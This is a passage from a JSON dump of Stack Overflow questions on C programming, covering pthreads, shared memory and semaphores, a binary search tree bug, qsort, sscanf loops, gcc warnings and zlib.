main()’:\ntest.cpp:9:28: error: invalid conversion from ‘void*’ to ‘int (*)[10]’ [-fpermissive]\n</code></pre>\n\n<p>Any idea what might be the reason?</p>\n"},{"tags":["c","performance","low-level","assembly"],"answer_count":28,"favorite_count":18,"up_vote_count":41,"down_vote_count":0,"view_count":6216,"score":41,"question_id":791533,"title":"Why do you program in assembly?","body":"<p>I have a question for all the hardcore low level hackers out there.  I ran across this sentence in a blog.  I don't really think the source matters (it's Haack if you really care) because it seems to be a common statement.</p>\n\n<blockquote>\n  <p>For example, many modern 3-D Games have their high performance core engine written in C++ and Assembly.</p>\n</blockquote>\n\n<p>As far as the assembly goes - is the code written in assembly because you don't want a compiler emitting extra instructions or using excessive bytes, or are you using better algorithms that you can't express in C (or can't express without the compiler mussing them up)?</p>\n\n<p>I completely get that it's important to understand the low-level stuff.  I just want to understand the <em>why</em> program in assembly after you do understand it.</p>\n\n<p><strong>Edit</strong>:  Wow!  Thank you all for the fantastic responses!  This was way better than I had hoped for!</p>\n"},{"tags":["c","void-pointers"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":88,"score":3,"question_id":13225513,"title":"convert pointer to pointer to void pointer","body":"<p>When I'm learning to use qsort to sort an array of string, there is a question puzzled me.\nFor example, to sort the following <code>s</code></p>\n\n<pre><code> char *s[] = {\n                   \"Amit\",\n                   \"Garima\",\n                   \"Gaurav\",\n                   \"Vaibhav\"\n                };\n</code></pre>\n\n<p>To use the qsort, you must provide a comparison function like the\nfollowing function <code>cstring_cmp</code> I guess in the qsort function, the type of parameter to be passed to the function <code>cstring_cmp</code> is <code>char**</code>. How to convert a <code>char**</code> to a <code>void*</code>? Why can we convert a <code>char**</code> to a <code>void*</code>?</p>\n\n<pre><code>    int cstring_cmp(const void *a, const void *b)\n    {\n        const char **ia = (const char **)a;\n        const char **ib = (const char **)b;\n        return -strcasecmp(*ia, *ib);\n        /* return the negative of the normal comparison */\n    }\n</code></pre>\n"},{"tags":["c","c-preprocessor"],"answer_count":2,"favorite_count":0,"up_vote_count":6,"down_vote_count":0,"view_count":71,"score":6,"question_id":13225921,"title":"\"##\" in printk, what does ## mean","body":"<pre><code>#define ext4_debug(f, a...)                     \\\n    do {                                \\\n        printk(KERN_DEBUG \"EXT4-fs DEBUG (%s, %d): %s:\",    \\\n            __FILE__, __LINE__, __func__);          \\\n        printk(KERN_DEBUG f, ## a);             \\\n    } while (0)\n</code></pre>\n\n<p>what I dont understand is this</p>\n\n<pre><code>printk(KERN_DEBUG f, ## a); \n</code></pre>\n\n<p>Could anybody help me to understand what is ## in this line?\nthank you</p>\n"},{"tags":["java","c++","c","glib"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":79,"score":2,"question_id":10627847,"title":"g_ascii_strcasecmp equivalent in java","body":"<p>I have a list of words sorted using <a href=\"http://developer.gnome.org/glib/2.28/glib-String-Utility-Functions.html#g-ascii-strcasecmp\" rel=\"nofollow\">g_ascii_strcasecmp</a> function. I need to process this list in java. What is the equivalent sorting function in java? In order to implement binary search I need a correct comparison function. So far I have the function below but it is not always produces the correct result.</p>\n\n<pre><code>public int compareStrings(String str) {\n    Collator collator = Collator.getInstance();//TODO: implement locale?\n    return collator.compare(this.wordString, str);\n}\n</code></pre>\n\n<p>UPDATE. List example: \"T, t, T'ai Chi Ch'uan, t'other, T-, T-bone, T-bone steak, T-junction, tabasco, Tabassaran, tabby\".</p>\n"},{"tags":["c","pthreads","mutex"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":62,"score":2,"question_id":13218720,"title":"pthread mutex lock/unlock in while(1)","body":"<p>I'm trying to write very simple multi threading program just to get the catch of it but I fail to understand what exactly is wrong in one of the cases. So:</p>\n\n<pre><code>#include &lt;stdlib.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;pthread.h&gt;\n\nchar string[100];\npthread_t thr_id_rd;\npthread_t thr_id_wr;\npthread_mutex_t lock = PTHREAD_MUTEX_INITIALIZER;\npthread_cond_t cond, cond1;\nint read = 0;\n\nvoid *thread_rd()\n{\n    pthread_mutex_lock(&amp;lock);\n    while (1) {\n        pthread_cond_wait(&amp;cond, &amp;lock);\n        printf(\"rd: entered: %s\\n\", string);\n        pthread_cond_signal(&amp;cond1);\n    }\n    pthread_mutex_unlock(&amp;lock);\n}\n\nvoid *thread_wr()\n{\n    pthread_mutex_lock(&amp;lock);\n    while (1) {\n        printf(\"wr: enter something: \");\n        scanf(\"%s\", string);\n        pthread_cond_signal(&amp;cond);\n        pthread_cond_wait(&amp;cond1, &amp;lock);\n    }\n    pthread_mutex_unlock(&amp;lock);\n}\n\nint main(int argc, char *argv[])\n{\n    pthread_create(&amp;thr_id_rd, NULL, thread_rd, NULL);\n    pthread_create(&amp;thr_id_wr, NULL, thread_wr, NULL);\n\n    pthread_join(thr_id_rd, NULL);\n    pthread_join(thr_id_wr, NULL);\n\n    return 0;\n}\n</code></pre>\n\n<p>The above seems to work correctly. But when I edit the two threads like this:</p>\n\n<pre><code>void *thread_rd()\n{\n    while (1) {\n        pthread_mutex_lock(&amp;lock);\n        pthread_cond_wait(&amp;cond, &amp;lock);\n        printf(\"rd: entered: %s\\n\", string);\n        pthread_cond_signal(&amp;cond1);\n        pthread_mutex_unlock(&amp;lock);\n    }\n}\n\nvoid *thread_wr()\n{\n    while (1) {\n        pthread_mutex_lock(&amp;lock);\n        printf(\"wr: enter something: \");\n        scanf(\"%s\", string);\n        pthread_cond_signal(&amp;cond);\n        pthread_cond_wait(&amp;cond1, &amp;lock);\n        pthread_mutex_unlock(&amp;lock);\n    }\n}\n</code></pre>\n\n<p>I'm getting undefined behavior - sometimes it's OK sometimes the program is stuck. According the man pages pthread_cond_wait <em>must</em> be called with mutex locked but there is no such restriction for _cond_signal (Question: What is the best practice?). So I decided to call it with mutex locked...</p>\n\n<p>Obviously I'm complete newbie so please excuse my stupid question :(\nI'll be very grateful if someone can explain this to me...</p>\n"},{"tags":["c","pointers","binary-search-tree"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":44,"score":2,"question_id":13188313,"title":"Why is my BST root pointer changing for some unknown reason?","body":"<p>I am trying to implement a Binary Search Tree data structure in C, and I have run into a bug. My pointer value changes for a reason I do not understand. (Please see bottom of post for strange output [Delete function and main functions clarify where output comes from] )\nMy Test function below:</p>\n\n<pre><code>int main(void)\n{\n    Bst *bst = ( Bst* ) calloc( 1, sizeof( Bst ) );\n    BstInsert( bst, 7 );\n    BstInsert( bst, 8 );\n    BstInsert( bst, 2 );\n    BstInsert( bst, 1 );\n    BstTraverse( bst );\n    BstRemove( bst, 7); \n    printf(\"=========================\\n\");\n    printf(\"Root Key: %d\\n\", bst-&gt;key );\n    printf(\"Left Key: %d\\n\", bst-&gt;left-&gt;key );\n    printf(\"Right Key: %d\\n\", bst-&gt;right-&gt;key );\n    printf(\"Location: %p\\n\", &amp;bst);\n    BstTraverse( bst );\n\n    return 0;\n}\n</code></pre>\n\n<p>My Delete Node function below:</p>\n\n<pre><code>void BstRemove( Bst *root, int key ){\n    //Seems like recursive algorithm would need doubly linked bst implementation\n    Bst *temp_node = BstFind( root, key );\n    Bst *parent_node = BstGetParent( root, key );\n    Bst *replacement_node = ( Bst* ) calloc( 1, sizeof( Bst ) );\n    if ( temp_node-&gt;key == root-&gt;key )\n    {   \n        if (root-&gt;left) replacement_node = BstMax( root-&gt;left );\n        else if ( root-&gt;right ) replacement_node = BstMin( root-&gt;right );\n        else replacement_node = NULL;\n    }\n    else if ( temp_node-&gt;left )\n    {\n        replacement_node = BstMax( temp_node );\n        Bst *parent_replacement_node = BstGetParent( root, replacement_node-&gt;key );\n        parent_replacement_node-&gt;right = NULL;\n    }\n    else if ( temp_node-&gt;right )\n    {\n        replacement_node = BstMin( temp_node );\n        Bst *parent_replacement_node = BstGetParent( root, replacement_node-&gt;key );\n        parent_replacement_node-&gt;left = NULL;\n    }\n    else\n        replacement_node = NULL;\n\n    if ( parent_node &amp;&amp; key &lt; parent_node-&gt;key )\n        parent_node-&gt;left = replacement_node;\n    else if ( parent_node )\n        parent_node-&gt;right = replacement_node;\n\n    if ( replacement_node )\n    {\n        if ( root-&gt;left-&gt;key != replacement_node-&gt;key ) replacement_node-&gt;left = temp_node-&gt;left;\n        if ( root-&gt;right-&gt;key != replacement_node-&gt;key ) replacement_node-&gt;right = temp_node-&gt;right;\n    }\n    root = replacement_node;\n    printf(\"Root Key: %d\\n\", root-&gt;key );\n    printf(\"Left Key: %d\\n\", root-&gt;left-&gt;key );\n    printf(\"Right Key: %d\\n\", root-&gt;right-&gt;key );\n    printf(\"Location: %p\\n\", &amp;root);\n    free(temp_node);\n}\n</code></pre>\n\n<p>Output Below:</p>\n\n<pre><code>1\n2\n7\n8\nRoot Key: 2\nLeft Key: 1\nRight Key: 8\nLocation: 0x7fffc5cf52e8\n=========================\nRoot Key: 0\nLeft Key: 2\nRight Key: 8\nLocation: 0x7fffc5cf5338\n1\n2\n8\n0\n8\n</code></pre>\n\n<p>The reason this confuses me so much is because I am using a pointer. I see no reason for the root->key value to change when it is 2 within the delete function, and once it is processed<br>\n    root->key becomes 0. I am grateful for anybody who can point out my problem or help me in the right direction. You can see my current BST implementation at <a href=\"https://github.com/PuffNotes/C/blob/master/data_structures/binary_tree.c\" rel=\"nofollow\">https://github.com/PuffNotes/C/blob/master/data_structures/binary_tree.c</a> if necessary. I recently started trying to program everyday to gain some skills, and consider myself to be a beginner in C ( for reference ). Thank you.</p>\n"},{"tags":["c","linux","bash","expect","rm"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":13223369,"title":"system command rm not working in expect program","body":"<p>I have a code (1) that is supposed to execute test in another code (its a pseudo-bash). This code (1) is wrote using the \"expect\" for the 'user simulation'.</p>\n\n<p>The problem is when this code (1) execute a system ( on this case, system \"rm totoExpect.txt titiExpect.txt\") when its just doesnt find the titiExpected.txt, but is there!</p>\n\n<p>There is nothing different between the two files, even the permissions are the same, i cant think in a reason that doesnt work.</p>\n\n<p>Here is the part of the code (1) where the problem raises:</p>\n\n<pre><code># test 5\nproc t5 {} {\n    send \"ls &gt; totoExpect.txt\\r\"\n    send \"cat &lt; totoExpect.txt | wc -l &gt; titiExpect.txt\\r\"\n    send \"cat titiExpect.txt\\r\"\n    expect -re \"(0|1|2|3|4|5|6|7|8|9)+.*&gt;\" { ok 5; } default { abort 5 }\n    system \"rm totoExpect.txt titiExpect.txt\"\n}\n</code></pre>\n\n<p>And the Error message:</p>\n\n<pre><code>ls &gt; totoExpect.txt\nout: totoExpect.txt\nseq[0]: 'ls' \n-----3\nensishell&gt;c\n ***** TEST 5 ok\n\nrm: não foi possível remover \"titiExpect.txt\": Arquivo ou diretório não encontrado\nchild process exited abnormally\n    while executing\n\"system \"rm totoExpect.txt titiExpect.txt\"\"\n    (procedure \"t5\" line 6)\n    invoked from within\n\"t5\"\n    (\"eval\" body line 1)\n    invoked from within\n\"eval \"t$t;\" \"\n    (\"foreach\" body line 1)\n    invoked from within\n\"foreach t {0 1 2 3 4 5 6 7} { eval \"t$t;\" } \"\n    invoked from within\n\"expect_user {\n    -timeout 30 \"auto\\n\" {\n    puts \"AUTO:\\n\";\n    foreach t {0 1 2 3 4 5 6 7} { eval \"t$t;\" } \n    }\n    -timeout 30 -re \"(\\[0123456789 \\]+)\\...\"\n    (file \"./testshell.expect\" line 99)\nmake: ** [test] Erro 1\n</code></pre>\n\n<p>Where \"rm: não foi possível remover \"titiExpect.txt\": Arquivo ou diretório não encontrado\" \nmeans \"rm: it was not possible to remove \"titiExpect.txt\": file or directory not found\" (sorry about that...)</p>\n\n<p>and this is the ls -l just after the error message (so titiExpect.txt shouldnt be there):</p>\n\n<pre><code>-rwxrwxr-x   1 fernando       fernando    273 Out 23 17:53 #Makefile#\n-rwxrwxr-x   1 fernando       fernando   6238 Nov  5 21:18 #ensishell.c#\n-rwxrwxr-x   1 fernando       fernando   1271 Out 24 20:30 #readcmd.h#\n-rwxrwxr-x   1 fernando       fernando   3250 Nov  5 21:07 #testshell.expect#\n-rwxrwxrwx   1 fernando       fernando    303 Out 24 20:21 Makefile\ndrwxrwxr-x   2 fernando       fernando   4096 Nov  4 19:06 SEPC shell\n-rw-rw-r--   1 fernando       fernando 193453 Out 18 18:25 Sujet_shell.pdf\n-rwxrwxr-x   1 fernando       fernando  25451 Nov  5 21:17 ensishell\n-rwxrwxrwx   1 fernando       fernando   6238 Nov  5 20:32 ensishell.c\n-rw-rw-r--   1 fernando       fernando  10664 Nov  5 21:17 ensishell.o\n-rwxrwxr-x   1 fernando       fernando   7251 Nov  4 00:33 foo\n-rw-rw-r--   1 fernando       fernando    173 Nov  4 00:33 foo.c\n-rw-rw-r--   1 fernando       fernando     16 Nov  4 01:15 in.txt~\n-rwxrwxrwx   1 fernando       fernando   6603 Out 23 00:37 readcmd.c\n-rwxrwxrwx   1 fernando       fernando   1271 Out 23 01:24 readcmd.h\n-rwxrwxrwx   1 fernando       fernando   1271 Out 23 00:37 readcmd.h~\n-rw-rw-r--   1 fernando       fernando  11216 Nov  5 21:17 readcmd.o\n-rwxrwxrwx   1 fernando       fernando   3250 Nov  5 20:41 testshell.expect\n-rwx------   1 fernando       fernando   1263 Nov  5 12:43 toto.txt\n</code></pre>\n\n<p>The worst problem is this code is not supposed to be modified, but its seems to me that is the programs fault this fail. (in fact, commenting the line solve the problem..)</p>\n\n<p>Any ideas?</p>\n"},{"tags":["c","sscanf"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":44,"score":1,"question_id":13225394,"title":"sscanf() in a while loop in C","body":"<p>I have a string <code>input</code> which contains words separated by white-space. I want to use <code>sscanf()</code> to split the words, store each word in <code>input_word</code> and print it, but I'm not sure how to put it in a while loop.</p>\n\n<p>This is what I have:</p>\n\n<pre><code> char input[max];\n char split_input[max];\n\n /* input gets populated here */\n\n while (sscanf(input,\" %s\", split_input)) {\n     printf(\"[%s]\\n\", split_input);\n }\n</code></pre>\n\n<p>What would be the condition to terminate the loop as soon as the last word in the sequence is split?</p>\n"},{"tags":["c","gcc"],"answer_count":4,"favorite_count":0,"up_vote_count":3,"down_vote_count":5,"view_count":112,"score":-2,"question_id":13225060,"title":"GCC treats int i=048; as an error, why couldn't GCC be more intelligent?","body":"<p>GCC treats <code>int i=048;</code> as an error because of <code>048</code> should be octal number, but <code>8</code> can't appear in an octal number. </p>\n\n<p>But why couldn't GCC be more intelligent and treat is as a decimal number?</p>\n"},{"tags":["c++","c","gcc","compiler-warnings"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":39,"score":2,"question_id":13224209,"title":"GCC -Wunused-function not working (but other warnings are working)","body":"<p>I'm trying to find unused functions in my codebase by using GCC's <code>-Wunused-function</code> flag.</p>\n\n<p>As I would expect, compiling the below code with <code>gcc -Wall -Wunused-function main.cpp</code> prints an <code>unused variable</code> warning:</p>\n\n<pre><code>warning: unused variable ‘x’ [-Wunused-variable]\n</code></pre>\n\n<p>However, the compiler doesn't give an <code>unused-function</code> warning. \n<strong>What do I have to do to make GCC notice the unused function <code>foo()</code>?</strong></p>\n\n<pre><code>// main.cpp\n\nvoid foo(){ } //should (but doesn't) trigger 'unused function' warning\n\nint main (int argc, char **argv){\n    int x; //correctly triggers 'unused variable' warning\n    return 0;\n}\n</code></pre>\n\n<p>Remember, I <strong>do want</strong> unused function warnings. This is <strong>not</strong> a \"how do I get rid of warnings\" question.</p>\n"},{"tags":["c","gzip","zlib"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":381,"score":1,"question_id":8766948,"title":"Uncompress a gzip File in Memory Using zlib Version 1.1.3","body":"<p>I have a gzip file that is in memory, and I would like to uncompress it using zlib, version 1.1.3.  Uncompress() is returning -3, Z_DATA_ERROR, indicating the source data is corrupt.  </p>\n\n<p>I know that my in memory buffer is correct - if I write the buffer out to a file, it is the same as my source gzip file.  </p>\n\n<p><a href=\"http://en.wikipedia.org/wiki/Gzip#File_format\" rel=\"nofollow\">The gzip file format</a> indicates that there is a 10 byte header, optional headers, the data, and a footer.  Is it possible to determine where the data starts, and strip that portion out?  I performed a search on this topic, and a couple people have suggested using inflateInit2().  However, in my version of zlib, that function is oddly commented out.  Is there any other options?</p>\n"},{"tags":["c"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":56,"score":0,"question_id":13224958,"title":"How to obtain substring from full string?","body":"<p>I have to try and use the GetSubstring function to print the result so that </p>\n\n<pre><code>printf(GetSubstring(\"character\", 4, 3, resultArray));\n</code></pre>\n\n<p>outputs <code>act</code></p>\n\n<p>Limitations: can't call other functions or macros, can't add any other variables, can't set variable to 0. Can only change function GetSubstring.</p>\n\n<p>Here is my current code.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\nchar *GetSubstring(const char source[], int start, int count, char result[]);\n\nint main(void)\n{\nconst char source[] = \"one two three\";\nchar result[] = \"123456789012345678\";\n\nputs(GetSubstring(\"character\", 4, 3, result));\n\nreturn(EXIT_SUCCESS);\n}\n\n\nchar *GetSubstring(const char source[], int start, int count, char result[])\n{\n    char *copy = result;\n    for (; *source != '\\0' || *source == source[start]; start--)\n    {\n        while (*source != '\\0')\n        {\n        *result++ = *source++;\n        }\n\n    }\n\n    *result = '\\0';\n    return (copy);                                      // outputs character\n    // return (result);                                 // outputs 012345678\n}\n</code></pre>\n\n<p>Thank you for your help.</p>\n"},{"tags":["c","unix","shared-memory","semaphore"],"answer_count":1,"favorite_count":1,"up_vote_count":2,"down_vote_count":1,"view_count":58,"score":1,"question_id":13223935,"title":"Programming in UNIX - Semaphores,shared memory in C","body":"<p>I started a week ago understanding and working with semaphores and shared memory, and actually created this program, the problem is i cant find anything wrong with it i been looking at it for hours and everything seems correct.. The code compiles and i can create the build but when i execute it nothing happens ...</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;sys/ipc.h&gt; \n#include &lt;sys/shm.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;sys/fcntl.h&gt;\n#include &lt;semaphore.h&gt;\n\n#define MAXCHILDS 4\n#define MAX_SIZE 10\n#define MAX_WRITES 4\n\ntypedef struct{\n    int m[MAX_SIZE][MAX_SIZE];\n} matrix;\n\n/*fork variables*/\npid_t child[MAXCHILDS];\n/*semphores variables */\nsem_t *empty, *full, * mutex;\n/*share memory id*/\nint shmid;\n/*shared memory array pointer */\nmatrix * sh_mem;\n/*pointer to matrix*/\nint **p;\n\n\nvoid init(){\n      /*create pointer to matrix*/\n      p = &amp;sh_mem-&gt;m;\n     /*semaphores unlink and creation */    \n     sem_unlink(\"EMPTY\");\n     empty=sem_open(\"EMPTY\",O_CREAT|O_EXCL,0700,MAX_WRITES);\n     sem_unlink(\"FULL\");\n     full=sem_open(\"FULL\",O_CREAT|O_EXCL,0700,0);\n     sem_unlink(\"MUTEX\");\n     mutex=sem_open(\"MUTEX\",O_CREAT|O_EXCL,0700,1);\n    /*initialize shared memory */\n    shmid = shmget(IPC_PRIVATE,sizeof(matrix),IPC_CREAT|0777);\n    /*map shared memory*/\n    sh_mem = (matrix*)shmat(shmid,NULL,0);\n    if(sh_mem== (matrix*)(-1)){\n        perror(\"shmat\");\n    }\n}\nvoid writer(int ** m){\n    int i,k;\n    for(i = 0;i&lt;MAX_SIZE;i++){\n        for(k= 0;k&lt;MAX_SIZE;k++){\n            m[i][k] = 0;\n        }\n    }\n\n}\nvoid reader(int **m){\n    int i = 0;\n    int k = 0;\n    for(i = 0;i&lt;MAX_SIZE;i++){\n        for(k= 0;k&lt;MAX_SIZE;k++){\n            printf(m[i][k]);\n        }\n        printf(\"\\n\");\n    }\n\n}\n\nvoid terminate() {\n  sem_close(empty);\n  sem_close(full);\n  sem_close(mutex);\n  sem_unlink(\"EMPTY\");\n  sem_unlink(\"FULL\");\n  sem_unlink(\"MUTEX\");\n  shmctl(shmid, IPC_RMID, NULL);\n}\n\nint main(int argc, char **argv)\n{\n    int i;\n    init();\n\n    for(i = 0;i&lt;MAXCHILDS;i++){\n        if((child[i]= fork()) &lt; 0) // error occured\n        {\n            perror(\"Fork Failed\");\n            exit(1);\n        }\n        if((child[i] =fork())==0){\n            writer(p);\n            exit(0);\n        }\n    }\n    /*father*/  \n    reader(p);\n    wait(NULL);\n\n    terminate();\n\n\n    return 0;\n}\n</code></pre>\n\n<p>The childs are supposed to write the the matrix in shared memory, and the father is supposed to read the shared memory array and the print the matrix.\nCan you help me with this? Thanks for the help ...</p>\n"},{"tags":["c++","c","multithreading","lock-free","memory-barriers"],"answer_count":8,"favorite_count":9,"up_vote_count":12,"down_vote_count":0,"view_count":4064,"score":12,"question_id":1185063,"title":"Memory barriers in userspace? (Linux, x86-64)","body":"<p>It is easy to set memory barriers on the kernel side: the macros mb, wmb, rmb, etc. are always in place thanks to the Linux kernel headers. </p>\n\n<p>How to accomplish this on the user side?</p>\n"},{"tags":["c","unix","shared-memory"],"answer_count":1,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":48,"score":0,"question_id":13224357,"title":"UNIX Shared memory and Semaphores in C","body":"<p>I started a week ago understanding and working with semaphores and shared memory, and actually created this program; the problem is I can't find anything wrong with it. I've been looking at it for hours and everything seems correct. The code compiles and i can create the build but when I execute it nothing happens.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;unistd.h&gt;\n#include &lt;sys/ipc.h&gt; \n#include &lt;sys/shm.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;sys/fcntl.h&gt;\n#include &lt;semaphore.h&gt;\n\n#define MAXCHILDS 4\n#define MAX_SIZE 10\n#define MAX_WRITES 4\n\ntypedef struct{\n    int m[MAX_SIZE][MAX_SIZE];\n} matrix;\n\n/*fork variables*/\npid_t child[MAXCHILDS];\n/*semphores variables */\nsem_t *empty, *full, * mutex;\n/*share memory id*/\nint shmid;\n/*shared memory array pointer */\nmatrix * sh_mem;\n/*pointer to matrix*/\nint **p;\n\nvoid init(){\n      /*create pointer to matrix*/\n      p = &amp;sh_mem-&gt;m;\n     /*semaphores unlink and creation */    \n     sem_unlink(\"EMPTY\");\n     empty=sem_open(\"EMPTY\",O_CREAT|O_EXCL,0700,MAX_WRITES);\n     sem_unlink(\"FULL\");\n     full=sem_open(\"FULL\",O_CREAT|O_EXCL,0700,0);\n     sem_unlink(\"MUTEX\");\n     mutex=sem_open(\"MUTEX\",O_CREAT|O_EXCL,0700,1);\n    /*initialize shared memory */\n    shmid = shmget(IPC_PRIVATE,sizeof(matrix),IPC_CREAT|0777);\n    /*map shared memory*/\n    sh_mem = (matrix*)shmat(shmid,NULL,0);\n    if(sh_mem== (matrix*)(-1)){\n        perror(\"shmat\");\n    }\n}\n\nvoid writer(int ** m){\n    int i,k;\n    for(i = 0;i&lt;MAX_SIZE;i++){\n        for(k= 0;k&lt;MAX_SIZE;k++){\n            m[i][k] = 0;\n        }\n    }\n}\n\nvoid reader(int **m){\n    int i = 0;\n    int k = 0;\n    for(i = 0;i&lt;MAX_SIZE;i++){\n        for(k= 0;k&lt;MAX_SIZE;k++){\n            printf(m[i][k]);\n        }\n        printf(\"\\n\");\n    }\n}\n\nvoid terminate() {\n  sem_close(empty);\n  sem_close(full);\n  sem_close(mutex);\n  sem_unlink(\"EMPTY\");\n  sem_unlink(\"FULL\");\n  sem_unlink(\"MUTEX\");\n  shmctl(shmid, IPC_RMID, NULL);\n}\n\nint main(int argc, char **argv)\n{\n    int i;\n    init();\n\n    for(i = 0;i&lt;MAXCHILDS;i++){\n        if ((child[i] = fork()) &lt; 0) // error occured\n        {\n            perror(\"Fork Failed\");\n            exit(1);\n        }\n        if ((child[i] = fork())==0){\n            writer(sh_mem-&gt;m);\n            exit(0);\n        }\n    }\n    /*father*/  \n    reader(sh_mem-&gt;m);\n    wait(NULL);\n\n    terminate();\n\n    return 0;\n}\n</code></pre>\n\n<p>The children are supposed to write the the matrix in shared memory, and the father is supposed to read the shared memory array and the print the matrix.\nCan you help me with this? Thanks for the help ...</p>\n"},{"tags":["c","recursion"],"answer_count":5,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":81,"score":3,"question_id":13224759,"title":"99 Bottle of Beer Recursion Doesn't Seem to Work","body":"<p>Ok here is the simple code i have written while on a learning process.</p>\n\n<pre><code>void SingTheSong (int NumOfBottles)\n{\n    if (NumOfBottles == 0){\n        printf(\"there are simply no more bottles of beer on the wall. \\n\");\n    }\n\n    else {\n        printf(\"%d bottles of beer on the wall, %d bottles of beer.\\n\", NumOfBottles, NumOfBottles);\n        int Bottleless = NumOfBottles - 1;\n        printf(\"Take one down pass it around, %d bottles of beer on the wall. \\n\", Bottleless);\n\n        SingTheSong(Bottleless);\n        printf(\"Put a bottle in the recycling bin, there are now %d empty bottles in the bin.\\n\", NumOfBottles);\n    }\n}\n\nint main(int argc, const char * argv[])\n{\n    SingTheSong(99);\n    return 0;\n}\n</code></pre>\n\n<p>the only thing i cant understand is why does the SingTheSong(Botteless) function start at 1 when the program is run, and why does it show the printf() statement after there is 0 bottles of beer on the wall. Just a liuttle confused because i thought everything within the curly braces was exicuted in the else statement before it runs the else statement again. why isn't it like this?</p>\n\n<p>Example:\n \"99 bottles of beer on the wall, 99 bottles of beer. Take one down, pass it around, 98 bottles of beer on the wall. \nPut a bottle in the recycling bin, there is now 1 empty bottles in the bin\"\n\"98 bottles of beer on the wall, 98 bottles of beer. Take one down, pass it around, 97 bottles of beer on the wall. \nPut a bottle in the recycling bin, there is now 2 empty bottles in the bin\"</p>\n\n<p>i know his is beginner stuff, i am a beginner. can someone explain this to me so i stop going in circles. thanks! </p>\n"},{"tags":["c++","c","floating-point","double-precision"],"answer_count":9,"favorite_count":10,"up_vote_count":29,"down_vote_count":1,"view_count":13975,"score":28,"question_id":2386772,"title":"Difference between float and double","body":"<p>I know, i've read about the difference between double precision and single precision etc. But they should give the same results on most cases right ?</p>\n\n<p>I was solving a problem on a programming contest and there were calculations with floating point numbers that were not really big so i decided to use float instead of double, and i checked it - i was getting the correct results. But when i send the solution, it said only 1 of 10 tests was correct. I checked again and again, until i found that using float is not the same using double. I put double for the calculations and double for the output, and the program gave the SAME results, but this time it passed all the 10 tests correctly.</p>\n\n<p>I repeat, the output was the SAME, the results were the SAME, but putting float didn't work - only double. The values were not so big too, and the program gave the same results on the same tests both with float and double, but the online judge accepted only the double-provided solution.</p>\n\n<p>Why ? What is the difference ? </p>\n"},{"tags":["c++","c"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":62,"score":1,"question_id":13224807,"title":"Use stream instead of snprintf","body":"<p>I'm not fairly familiar in C++ stream API and I want to convert a C code using stream in C++,</p>\n\n<pre><code>char sHex[20] = {0};\nint numid = 2;\n\nsnprintf( sHex, sizeof(sHex) - 1, \"%X\", numId );\n</code></pre>\n"},{"tags":["c++","c","xcode","dll"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":24,"score":0,"question_id":13224623,"title":"Xcode won't recognize my dynamic library","body":"<p>I built a custom dynamic library using the C/C++ Library Template. Inside of the Library I have 2 files:</p>\n\n<p>SimpleActions.c</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include \"SimpleActions.h\"\n\nvoid println(char* string)\n{\n    printf(\"%s\", string);\n}\n</code></pre>\n\n<p>SimpleActions.h</p>\n\n<pre><code>#ifndef PracticeLibrary_SimpleActions_h\n#define PracticeLibrary_SimpleActions_h\n\nvoid println(char*);\n\n#endif\n</code></pre>\n\n<p>Then, I preformed a build on the library.</p>\n\n<p>Then, I made a new Project called TestLibrary. I added my library to the build path by going to Build Phases -> Link Binaries With Libraries -> + -> Add Other -> (path to my library)</p>\n\n<p>My library now appears in the build path. Now I made this file:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include \"SimpleActions.h\" //&lt;&lt;---- ERROR\n\nint main(int argc, const char * argv[])\n{\n\n    // insert code here...\n    printf(\"Hello, World!\\n\");\n    return 0;\n}\n</code></pre>\n\n<p>I get an error that says \"SimpleActions.h is not found.\" What did I do wrong?</p>\n\n<hr>\n\n<p>I added SimpleActions.h to my build path, then I was able to build and run the project but I got the following error:</p>\n\n<pre><code>dyld: Library not loaded: /usr/local/lib/libPracticeLibrary.dylib\nReferenced from: /Users/*****/Library/Developer/Xcode/DerivedData/UseLibrary-detiyfzxdbczfhlgufhfkvk/Build/Products/Debug/UseLibrary\nReason: image not found\n(lldb) \n</code></pre>\n"},{"tags":["c","pointers"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":64,"score":-1,"question_id":13224383,"title":"Pointer to struct","body":"<p>I am working on assignment. I started with the struct:</p>\n\n<pre><code>struct figures_struct\n{\n    char figure_name[130];\n    double figure_coordinates[1000000];\n};\n</code></pre>\n\n<p>When I read name of the figure from the file, I stored it into the struct as follows:</p>\n\n<pre><code>strcpy(figures[i].figure_name,f_name);\n</code></pre>\n\n<p>Now I have to modify my code and need to use dynamic memory. I did: </p>\n\n<pre><code>struct figures_struct\n{\n    char figure_name[130];\n    double figure_coordinates[100000];\n};\n\nstruct figures_struct *figures = malloc(size * sizeof(struct figures_struct));\n</code></pre>\n\n<p>Now, how do I store figure name into my struct? <code>figures[i].figure_name</code> does not seem to be working.</p>\n"},{"tags":["c"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":67,"score":0,"question_id":13224645,"title":"Data 